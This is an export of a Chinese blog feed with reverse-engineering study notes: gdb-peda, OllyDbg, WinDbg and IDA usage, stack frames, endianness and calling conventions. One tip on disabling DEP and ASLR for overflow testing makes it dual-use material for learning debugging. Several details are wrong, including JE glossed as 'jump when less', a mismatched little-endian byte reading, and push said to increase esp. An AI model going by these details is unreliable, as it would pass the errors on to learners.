class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/test1$ cat command.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">for (i=0;i&lt;argc;i++)</span><br><span class="line">printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">xxx@ubuntu:~/Desktop/test1$ gcc -g command.c -o command</span><br><span class="line">xxx@ubuntu:~/Desktop/test1$ gdb -q ./command</span><br><span class="line">Reading symbols from ./command...done.</span><br><span class="line">gdb-peda$ l</span><br><span class="line">1#include &lt;stdio.h&gt;</span><br><span class="line">2int main(int argc,char *argv[])</span><br><span class="line">3&#123;</span><br><span class="line">4int i;</span><br><span class="line">5for (i=0;i&lt;argc;i++)</span><br><span class="line">6printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);</span><br><span class="line">7return 0;</span><br><span class="line">8&#125;</span><br><span class="line">gdb-peda$ b 6</span><br><span class="line">Breakpoint 1 at 0x400545: file command.c, line 6.</span><br><span class="line">gdb-peda$ run param1 param2 param3</span><br><span class="line">Starting program: /home/xxx/Desktop/test1/command param1 param2 param3</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x0 </span><br><span class="line">RDX: 0x7fffffffe010 --&gt; 0x7fffffffe390 (&quot;XDG_VTNR=7&quot;)</span><br><span class="line">RSI: 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</span><br><span class="line">RDI: 0x4 </span><br><span class="line">RBP: 0x7fffffffdf00 --&gt; 0x0 </span><br><span class="line">RSP: 0x7fffffffdee0 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</span><br><span class="line">RIP: 0x400545 (&lt;main+24&gt;:mov    eax,DWORD PTR [rbp-0x4])</span><br><span class="line">R8 : 0x7ffff7dd4e80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dea700 (&lt;_dl_fini&gt;:push   rbp)</span><br><span class="line">R10: 0x7fffffffdd90 --&gt; 0x0 </span><br><span class="line">R11: 0x7ffff7a32e50 (&lt;__libc_start_main&gt;:push   r14)</span><br><span class="line">R12: 0x400440 (&lt;_start&gt;:xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffdfe0 --&gt; 0x4 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400538 &lt;main+11&gt;:mov    QWORD PTR [rbp-0x20],rsi</span><br><span class="line">   0x40053c &lt;main+15&gt;:mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">   0x400543 &lt;main+22&gt;:jmp    0x400574 &lt;main+71&gt;</span><br><span class="line">=&gt; 0x400545 &lt;main+24&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x400548 &lt;main+27&gt;:cdqe   </span><br><span class="line">   0x40054a &lt;main+29&gt;:lea    rdx,[rax*8+0x0]</span><br><span class="line">   0x400552 &lt;main+37&gt;:mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x400556 &lt;main+41&gt;:add    rax,rdx</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdee0 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</span><br><span class="line">0008| 0x7fffffffdee8 --&gt; 0x400400440 </span><br><span class="line">0016| 0x7fffffffdef0 --&gt; 0x7fffffffdfe0 --&gt; 0x4 </span><br><span class="line">0024| 0x7fffffffdef8 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf00 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdf08 --&gt; 0x7ffff7a32f45 (&lt;__libc_start_main+245&gt;:mov    edi,eax)</span><br><span class="line">0048| 0x7fffffffdf10 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf18 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=0x4, argv=0x7fffffffdfe8) at command.c:6</span><br><span class="line">6printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);</span><br><span class="line">gdb-peda$ p i</span><br><span class="line">$1 = 0x0</span><br><span class="line">gdb-peda$ p argv</span><br><span class="line">$2 = (char **) 0x7fffffffdfe8</span><br><span class="line">gdb-peda$ p argc</span><br><span class="line">$3 = 0x4</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></li></ul><h4 id="不定期更新"><a href="#不定期更新" class="headerlink" title="不定期更新"></a>不定期更新</h4><ul><li><p>查看eip的address，可以使用info frame命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info frame</span><br><span class="line">Stack level 0, frame at 0xbfffeeb4:</span><br><span class="line"> eip = 0x42424242; saved eip = 0x0</span><br><span class="line"> called by frame at 0xbfffeeb8</span><br><span class="line"> Arglist at 0xbfffeeac, args: </span><br><span class="line"> Locals at 0xbfffeeac, Previous frame&apos;s sp is 0xbfffeeb4</span><br><span class="line"> Saved registers:</span><br><span class="line">  eip at 0xbfffeeb0</span><br></pre></td></tr></table></figure></li><li><p>查看程序存在的函数  info  func</p></li></ul><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul><li>linux 调试工具 GDB 使用教程<br><a href="http://bbs.pediy.com/thread-77746.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-77746.htm</a></li><li>Quick Intro to gdb<br><a href="https://www.youtube.com/watch?v=xQ0ONbt-qPs" target="_blank" rel="noopener">https://www.youtube.com/watch?v=xQ0ONbt-qPs</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>window逆向基础</title>
      <link href="/2017/08/24/window%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
      <url>/2017/08/24/window%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<h4 id="常见汇编指令助记"><a href="#常见汇编指令助记" class="headerlink" title="常见汇编指令助记"></a>常见汇编指令助记</h4><p>JG / JNLE：Jump when Greater / Jump when Not Less or Equal<br>JL / JNGE：Jump when Less / Jump when Not Greater or Equal<br>JGE / JNL：Jump when Greater or Equal / Jump when Not Less<br>JLE / JNG：Jump when Less or Equal / Jump when Not Greater<br>JE / JZ：Jump when Less / Jump when Zero</p><h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>windows操作系统兼容的CPU为小端（内存高位地址存放数据高位字节数据）方式，而UNIX操作系统所兼容的CPU大多为大端（内存高位地址存放数据低位字节数据）方式。此外，还有一个网络字节序，是指网络传输相关协议所规定的字节传输顺序，TCP/IP协议所使用的字节序为大端方式。</p><ul><li>大端模式，是指数据的高字节保存在内存的低地址中，而数据的低字节保存<br>在内存的高地址中，这样的存储模式有点儿类似于把数据 当作字符串顺序处理:<br>地址由小向大增加，而数据从高位往低位放; 这和我们的阅读 习惯一致</li><li>小端模式，是指数据的高字节保存在内存的高地址中，而数据的低字节保存<br>在内存的低地址中，这种存储模式将地址的高低和数据位权有效 地结合起来，<br>高地址部分权值高，低地址部分权值低<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000430: e684 6c4e 0100 1800 53ef 0100 0100 00000000440: b484 6c4e 004e ed00 0000 0000 0100 0000 </span><br><span class="line">在大端模式下，前32位应该这样读: e6 84 6c 4e ( 假设int占4个字节) </span><br><span class="line">在小端 模式下，前32位应该这样读: 4e 6c 84 b4 ( 假设int占4个字节)</span><br></pre></td></tr></table></figure></li></ul><h4 id="高级语言和低级语言"><a href="#高级语言和低级语言" class="headerlink" title="高级语言和低级语言"></a>高级语言和低级语言</h4><p><img src="/2017/08/24/window逆向基础/lowlevel.png" alt=""></p><ul><li>如上图所示，很好展示了低级语言、高级语言和机器码之间的联系<h4 id="windows内存布局"><a href="#windows内存布局" class="headerlink" title="windows内存布局"></a>windows内存布局</h4></li><li>和linux内存布局类似，windows的内存布局如下<br><img src="/2017/08/24/window逆向基础/windowsmemlayout.png" alt=""><h4 id="X86汇编基础-栈"><a href="#X86汇编基础-栈" class="headerlink" title="X86汇编基础-栈"></a>X86汇编基础-栈</h4><img src="/2017/08/24/window逆向基础/stack.png" alt=""><h4 id="pe结构"><a href="#pe结构" class="headerlink" title="pe结构"></a>pe结构</h4></li><li><img src="/2017/08/24/window逆向基础/peimage.png" alt=""><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li><li>API 函数 －－ API 绝密档案系列之一<br><a href="http://bbs.pediy.com/user-22319-1.htm" target="_blank" rel="noopener">http://bbs.pediy.com/user-22319-1.htm</a></li><li>Win32环境下函数调用的堆栈之研究<br><a href="http://bbs.pediy.com/thread-69909.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-69909.htm</a></li><li>汇编的学习<br><a href="http://bbs.pediy.com/user-90551-1-1.htm" target="_blank" rel="noopener">http://bbs.pediy.com/user-90551-1-1.htm</a><br><a href="http://bbs.pediy.com/user-202613-0-1.htm" target="_blank" rel="noopener">http://bbs.pediy.com/user-202613-0-1.htm</a></li><li>window线程<br><a href="http://bbs.pediy.com/thread-77556.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-77556.htm</a></li><li>C++类虚函数逆向学习总结<br><a href="http://bbs.pediy.com/thread-60538.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-60538.htm</a></li><li>MFC逆向初级研究<br><a href="http://bbs.pediy.com/thread-41087.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-41087.htm</a></li><li>驱动安全<br><a href="http://blog.csdn.net/zuishikonghuan/" target="_blank" rel="noopener">http://blog.csdn.net/zuishikonghuan/</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>栈帧</title>
      <link href="/2017/08/23/%E6%A0%88%E5%B8%A7/"/>
      <url>/2017/08/23/%E6%A0%88%E5%B8%A7/</url>
      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>栈帧 stack frame<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4></li><li>主要通过od来跟踪调试一下，理解一下windows栈的调用情况。<h4 id="环境及代码"><a href="#环境及代码" class="headerlink" title="环境及代码"></a>环境及代码</h4>环境win7 32位+vc6.0<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">long add(long a, long b)</span><br><span class="line">&#123;</span><br><span class="line">    long x = a, y = b;</span><br><span class="line">    return (x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    long a = 1, b = 2;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%d\n&quot;, add(a, b));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>在这之前，首先找到main函数，并加上一定的注释以及对应的断点。<br>1.首先是进入main函数之前，我们查看一下ebp的值是0012ff88，esp是0012ff50，注意此时下一条指令的地址是00401279，如下图<br><img src="/2017/08/23/栈帧/1.png" alt=""><br>2.这个时候f7进入main函数，这个时候esp变成0012ff4c即减小了4，ebp不变<br><img src="/2017/08/23/栈帧/2.png" alt=""><br>3.然后有一个跳转到push ebp，所以执行这个代码时候，ebp的值会入栈，esp的值加4，变成00112ff48<br><img src="/2017/08/23/栈帧/3.png" alt=""><br>4.f8执行 mov ebp,esp命令，这个时候ebp的值发生变化，变成和esp一样的值都是0012ff48<br><img src="/2017/08/23/栈帧/4.png" alt=""><br>5.f8执行 sub esp,48 扩展栈空间，esp减小48h个长度，ebp保持不变<br><img src="/2017/08/23/栈帧/5.png" alt=""><br>6.f8 然后就是将ebx，esi，edi等入栈的操作等<br>。。。<br>7.函数的返回要注意清场,栈顶和栈底是一样的都是0012ff48<br><img src="/2017/08/23/栈帧/6.png" alt=""><br>8.f8执行pop ebp，这个时候是将栈顶中的值0012ff88放到ebp中，那么ebp的值发生变化成为0012ff88，执行pop操作，esp+4 为0012ff4c<br><img src="/2017/08/23/栈帧/7.png" alt=""><br>9.f8 执行retn指令，esp发生变化+4变为0012ff50，ebp的值为0012ff88，eip指向00401279，即call main函数的下一条指令执行<br><img src="/2017/08/23/栈帧/8.png" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>main函数的过程中，进入之前栈底指针ebp是0012ff88，栈顶指针是0012ff50，结束函数之后，没有发生变化，即栈维持这平衡。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li><li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/papers-9426.html</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>OllyDbg使用入门</title>
      <link href="/2017/08/22/OllyDbg%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"/>
      <url>/2017/08/22/OllyDbg%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>ollydbg有官方的下载的版本，也有其它修改版，其中我们最常用的是吾爱破解版本的od，其插件较多，较为方便。后面的介绍也是基本以吾爱破解的版本为主。<h4 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h4></li><li>f8单步步过</li><li>f7单步步入</li><li>f9运行，执行到下个断点</li><li>f2下断点</li><li>ctrl + g 跳转到指定地址</li><li>ctrl+f9执行到返回，遇到断点会停下<h4 id="一些常用的操作"><a href="#一些常用的操作" class="headerlink" title="一些常用的操作"></a>一些常用的操作</h4></li><li>可通过双击汇编窗口注释区或者右键给汇编代码添加注释，方便自己后续阅读，这里有一个小技巧，可以通过ida的静态分析方法进行静态分析加注释<br><img src="/2017/08/22/OllyDbg使用入门/1.png" alt=""><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4></li><li>主视图切换<br><img src="/2017/08/22/OllyDbg使用入门/views.png" alt=""></li><li>有时候在调试的时候，一直在循环里，如果想要跳出循环，这个时候鼠标点到下一个命令的执行处，f4即可，即运行到当前代码处</li><li>在用vs较高版本编译程序测试溢出等的时候注意要关闭保护功能(如常见的dep以及aslr)，在项目菜单的属性里面设置<br><img src="/2017/08/22/OllyDbg使用入门/aslr.png" alt=""><br><img src="/2017/08/22/OllyDbg使用入门/sec.png" alt=""></li><li>在跟踪调试的时候，我们关注的是每步执行过后寄存器的变化情况，这个时候观察寄存器的窗口，红色的表示是发生了变化的数据。<br><img src="/2017/08/22/OllyDbg使用入门/0.png" alt=""></li><li>在进行动态分析的时候，最好完整的分析一个栈的出入过程，加上注释之后，对代码分析有好处</li><li>刚开始调试的时候，容易跑飞，这个时候注意观察左上角的提示框，回显示你的module，不要进去了什么kernel模块</li><li>注意由于基本上我们使用的系统上数据或者代码都是小端存储的，所以在看反汇编代码的时候看到机器码的时候，一定要倒过来看<br><img src="/2017/08/22/OllyDbg使用入门/2.png" alt=""></li><li>通过菜单中的查看内存map，整个可执行文件结构在内存中的地址映射<br><img src="/2017/08/22/OllyDbg使用入门/3.png" alt=""><br>此外还有L可以查看log data信息，E查看可执行模块，B查看断点信息。</li><li>在vc6编译的程序中，函数返回之前会有一句call  _checkesp，这里会有一个checkesp函数的调用，来检查栈是否平衡，如果不平衡会出现如下的错误，我在这里做一个测试，在return语句之前加一条内联汇编push ebx，这样就破坏了栈平衡如下图所示<br><img src="/2017/08/22/OllyDbg使用入门/4.png" alt=""></li><li>vc中函数的调用方式是cdecl，这种函数调用约定对参数的传递依靠栈内存，在调用函数前，将通过压栈操作将参数从右至左依次送入栈中，当函数返回的时候，需要将参数使用的空间回收，这里的回收指的是恢复esp寄存器的值到函数调用前的值，对于cdecl调用方式而言，平衡堆栈的操作是由函数调用方来做的，在这里也就是要由main()函数来做的，可以看到反汇编代码add esp，8就是用来平衡栈的。主要用于平衡上面的两个push操作。<br><img src="/2017/08/22/OllyDbg使用入门/5.png" alt=""></li><li>函数返回值通常保存在eax寄存器中，在c语言中，main()函数的返回值为0，即return0，因此xor eax,eax 就是对eax进行了清零操作。</li><li>windows系统下，对API函数的调用遵循约定是stdcall，对于stdcall而言，参数依然是从右向左依次入栈，而参数的平栈则是在api函数内部完成的，而不是在函数调用时候完成的。<br><a href="6.png"></a><br>上图中可以看到在调用MessageBox()的时候,在retn指令后面加了一个10，10这里是十六进制，也就是十进制中的16，我们在为MessageBoxA传递参数的时候，每个参数是4字节，4*4=16个字节，因此retn 16除了有返回的作用外，还包含了add esp,10的作用。<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4></li><li>在看雪上有人翻译了国外人写的&lt;使用ollydbg从零开始cracking&gt;，还是挺详细的介绍了od的使用，推荐阅读和动手跟一遍。<br><a href="https://bbs.pediy.com/thread-184679.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-184679.htm</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li><li>OllyDbg 入门系列<br><a href="http://bbs.pediy.com/user-24467-3-1.htm" target="_blank" rel="noopener">http://bbs.pediy.com/user-24467-3-1.htm</a></li><li>拿几个ctf的简单题目练习一下<br><a href="https://github.com/lcatro/SISE_Traning_CTF_RE" target="_blank" rel="noopener">https://github.com/lcatro/SISE_Traning_CTF_RE</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>windbg使用</title>
      <link href="/2017/08/21/windbg%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/08/21/windbg%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://bbs.pediy.com/thread-94457.htm" target="_blank" rel="noopener">WinDbg学习笔记（一）–认识WinDbg</a><br><a href="http://bbs.pediy.com/thread-34379.htm" target="_blank" rel="noopener">从Ollydbg说起—–WinDbg用户态调试教程</a><br><a href="http://bbs.pediy.com/thread-34958.htm" target="_blank" rel="noopener">Windbg基本调试技术</a><br><a href="http://1drv.ms/1q2aPk6" target="_blank" rel="noopener">Windows 调试器 WinDBG 和 KD 学习系列 PPT</a>(<a href="https://www.youtube.com/watch?v=8zBpqc3HkSE&amp;list=PLhx7-txsG6t6n_E2LgDGqgvJtCHPL7UFu)(https://www.youtube.com/user/TheSourceLens)(https://www.youtube.com/user/TheSourceLens" target="_blank" rel="noopener">https://www.youtube.com/watch?v=8zBpqc3HkSE&amp;list=PLhx7-txsG6t6n_E2LgDGqgvJtCHPL7UFu)(https://www.youtube.com/user/TheSourceLens)(https://www.youtube.com/user/TheSourceLens</a>)</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>IDA使用</title>
      <link href="/2017/08/18/IDA%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/08/18/IDA%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>先说说反汇编软件IDA原理，反汇编软件去识别二进制文件格式，比如文件的格式是PE，那么它会利用其针对PE的内置“规则“对该二进制文件进行分析，最终将其转换为“好看”一点儿，方便人们阅读的格式(其中包括视图展现形式、伪c代码、汇编代码等)，其本身并不会像ollydbg去加载程序执行。(当然IDA也能动态调试)</li><li>IDA(Interactive Disassembler Professional)交互式反汇编专业版，是一款目前最棒的静态反编译软件，可以用来分析pe、elf等格式程序。</li><li>较od的动态分析IDA提供了F5键(F5功能是一个插件)查看伪代码的功能，使用非常方便，在ctf的reverse题目中应用很多。<h4 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h4>在介绍常见操作之前，先来看一下用ida加载一个文件的时候，默认的展示窗口有哪些<br><img src="/2017/08/18/IDA使用/2.png" alt=""><br>注意在反汇编代码的窗口可以输入空格切换到Graphic View，可以更清楚的看清流程</li><li>跳转到指定内存地址 快捷键G，可以调到相应的地址</li><li>寻找关键特征字符串，打开字符串参考窗口 shift+f12 ，类似于od中plugins中的中文搜索引擎中的智能搜索功能<br><img src="/2017/08/18/IDA使用/1.png" alt=""></li><li>函数的收缩和展开功能<br><img src="/2017/08/18/IDA使用/3.png" alt=""></li><li>在vc6中main()不是程序运行的第一个函数，而是程序员编写程序的第一个函数，main()函数是由启动函数来调用的，vc6中入口点是_mainCRTStartup()函数，如下图所示<br><img src="/2017/08/18/IDA使用/4.png" alt=""><br>双击即可到达这个函数的位置，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">.text:00401130                 push    ebp</span><br><span class="line">.text:00401131                 mov     ebp, esp</span><br><span class="line">.text:00401133                 push    0FFFFFFFFh</span><br><span class="line">.text:00401135                 push    offset stru_422130</span><br><span class="line">.text:0040113A                 push    offset __except_handler3</span><br><span class="line">.text:0040113F                 mov     eax, large fs:0</span><br><span class="line">.text:00401145                 push    eax</span><br><span class="line">.text:00401146                 mov     large fs:0, esp</span><br><span class="line">.text:0040114D                 add     esp, 0FFFFFFF0h</span><br><span class="line">.text:00401150                 push    ebx</span><br><span class="line">.text:00401151                 push    esi</span><br><span class="line">.text:00401152                 push    edi</span><br><span class="line">.text:00401153                 mov     [ebp+ms_exc.old_esp], esp</span><br><span class="line">.text:00401156                 call    ds:__imp__GetVersion@0 ; GetVersion()</span><br><span class="line">.text:0040115C                 mov     __osver, eax</span><br><span class="line">.text:00401161                 mov     eax, __osver</span><br><span class="line">.text:00401166                 shr     eax, 8</span><br><span class="line">.text:00401169                 and     eax, 0FFh</span><br><span class="line">.text:0040116E                 mov     __winminor, eax</span><br><span class="line">.text:00401173                 mov     ecx, __osver</span><br><span class="line">.text:00401179                 and     ecx, 0FFh</span><br><span class="line">.text:0040117F                 mov     __winmajor, ecx</span><br><span class="line">.text:00401185                 mov     edx, __winmajor</span><br><span class="line">.text:0040118B                 shl     edx, 8</span><br><span class="line">.text:0040118E                 add     edx, __winminor</span><br><span class="line">.text:00401194                 mov     __winver, edx</span><br><span class="line">.text:0040119A                 mov     eax, __osver</span><br><span class="line">.text:0040119F                 shr     eax, 10h</span><br><span class="line">.text:004011A2                 and     eax, 0FFFFh</span><br><span class="line">.text:004011A7                 mov     __osver, eax</span><br><span class="line">.text:004011AC                 push    0</span><br><span class="line">.text:004011AE                 call    __heap_init</span><br><span class="line">.text:004011B3                 add     esp, 4</span><br><span class="line">.text:004011B6                 test    eax, eax</span><br><span class="line">.text:004011B8                 jnz     short loc_4011C4</span><br><span class="line">.text:004011BA                 push    1Ch</span><br><span class="line">.text:004011BC                 call    fast_error_exit</span><br><span class="line">.text:004011C1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011C1                 add     esp, 4</span><br><span class="line">.text:004011C4</span><br><span class="line">.text:004011C4 loc_4011C4:                             ; CODE XREF: _mainCRTStartup+88j</span><br><span class="line">.text:004011C4                 mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">.text:004011CB                 call    __ioinit</span><br><span class="line">.text:004011D0                 call    ds:__imp__GetCommandLineA@0 ; GetCommandLineA()</span><br><span class="line">.text:004011D6                 mov     __acmdln, eax</span><br><span class="line">.text:004011DB                 call    ___crtGetEnvironmentStringsA</span><br><span class="line">.text:004011E0                 mov     __aenvptr, eax</span><br><span class="line">.text:004011E5                 call    __setargv</span><br><span class="line">.text:004011EA                 call    __setenvp</span><br><span class="line">.text:004011EF                 call    __cinit</span><br><span class="line">.text:004011F4                 mov     ecx, __environ</span><br><span class="line">.text:004011FA                 mov     ___initenv, ecx</span><br><span class="line">.text:00401200                 mov     edx, __environ</span><br><span class="line">.text:00401206                 push    edx             ; envp</span><br><span class="line">.text:00401207                 mov     eax, ___argv</span><br><span class="line">.text:0040120C                 push    eax             ; argv</span><br><span class="line">.text:0040120D                 mov     ecx, ___argc</span><br><span class="line">.text:00401213                 push    ecx             ; argc</span><br><span class="line">.text:00401214                 call    _main_0</span><br></pre></td></tr></table></figure></li></ul><p>如上所示，是进入这个函数后的汇编代码，可以看到main函数在00401214位置处，启动函数从00401130地址处开始，期间调用了GetVersion()函数获得了系统版本号，调用__heap_init函数初始化了程序所使用的堆空间，调用了GetCommandLineA()函数获取了命令行参数,调用_crtGetEnvironmentStringsA()获取了环境变量字符串，在完成一系列启动所需的工作之后，终于在00401214处调用了main()函数。</p><ul><li>在调用printf时候的指令为call printf,而调用像是MessageBoxA时候的指令是call    ds:<strong>imp</strong>MessageBoxA@16 ; MessageBoxA(x,x,x,x)，printf函数在stdio.h头文件中，该函数是c语言的静态库，在链接的时候会将其代码接入到二进制文件中(静态包含)，而MessageBoxA的函数实现是在user32.dll这个动态链接库中，在代码中，这里只是留了进入MessageBoxA函数的一个地址，并没有具体的代码，MessageBoxA的具体地址存放在数据节区中，因此在反汇编代码中给出了提示，使用了前缀”ds”,<strong>imp</strong>表示导入函数，@16表示16个字节，16/4即函数又4个参数。注意 在od中汇编代码是这样call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;]，感觉没有ida的友好。</li><li>switch case default结构的特征<br><img src="/2017/08/18/IDA使用/6.png" alt=""></li><li>名称与命名<br>在进行样本分析时，ID A识别出来的函数名都是sub_xxxxxx，这种命名方式不适合我们阅读和分析，在我们进行分析后，知道函数或者变量的意义，那么我们可以对其进行重命名。方法是鼠标点击函数名或者变量，然后按下键盘上的N键，在弹出的窗口中写入新的名字即可。</li><li>交叉引用<br>IDA提供了大量显示和访问交叉引用数据的机制，它以更加直观的方式显示代码和数据之间的关系。在IDA中有两种交叉引用，一种是代码交叉引用，一种是数据交叉引用。如下就是一个代码交叉引用<br><img src="/2017/08/18/IDA使用/xref.png" alt=""><br>在图中可以知道被引用者是?test@@YAXXZ,_main+18是引用者，向下的键条表示引用者的地址要比?test@@YAXXZ的地址高，上行反之。还有其后面的P表示由函数调用导致的交叉引用使用后缀↓p（看做是Procedure）。而跳转交叉引用使用后缀↑j（看做是Jump）。此外还有数据的交叉引用又分为数据读取交叉引用、数据写入交叉引用、数据偏移量交叉引用。</li><li>快捷键R 将数字串转换为char字符串</li><li>IDA是一款非常复杂且非常非常强大，更多见《IDA Pro权威指南》<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="http://www.pediy.com/kssd/pediy12/ida.html" target="_blank" 